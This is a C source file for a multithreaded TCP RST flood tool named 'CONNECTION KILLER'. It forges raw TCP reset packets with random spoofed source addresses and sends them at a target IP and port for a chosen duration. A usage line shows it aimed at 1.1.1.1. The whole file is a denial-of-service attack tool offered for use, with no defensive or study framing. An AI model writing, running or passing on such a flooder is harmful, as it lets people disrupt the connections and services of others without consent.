#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int threads;
    int packet_size;
} rst_params;

void *rst_flood(void *arg) {
    rst_params *params = (rst_params *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    time_t end_time = time(NULL) + params->duration;
    unsigned int src_ip;
    unsigned int seq = rand();
    
    while (time(NULL) < end_time) {
        src_ip = rand() | (rand() << 16);
        
        memset(packet, 0, 4096);
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = rand();
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = src_ip;
        iph->daddr = dest.sin_addr.s_addr;
        
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(params->target_port);
        tcph->seq = htonl(seq++);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 0;
        tcph->rst = 1;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        sendto(sock, packet, iph->tot_len, 0, 
               (struct sockaddr *)&dest, sizeof(dest));
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║           CONNECTION KILLER              ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");
    
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        printf("Example: %s 1.1.1.1 80 60 50\n", argv[0]);
        return 1;
    }
    
    srand(time(NULL));
    
    rst_params params;
    params.target_port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    params.threads = atoi(argv[4]);
    strcpy(params.target_ip, argv[1]);
    
    printf("[+] Target: %s:%d\n", params.target_ip, params.target_port);
    printf("[+] Mode: RST Flood\n\n");
    
    pthread_t threads[params.threads];
    
    for (int i = 0; i < params.threads; i++) {
        pthread_create(&threads[i], NULL, rst_flood, &params);
    }
    
    for (int i = 0; i < params.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[+] Attack completed\n");
    return 0;
}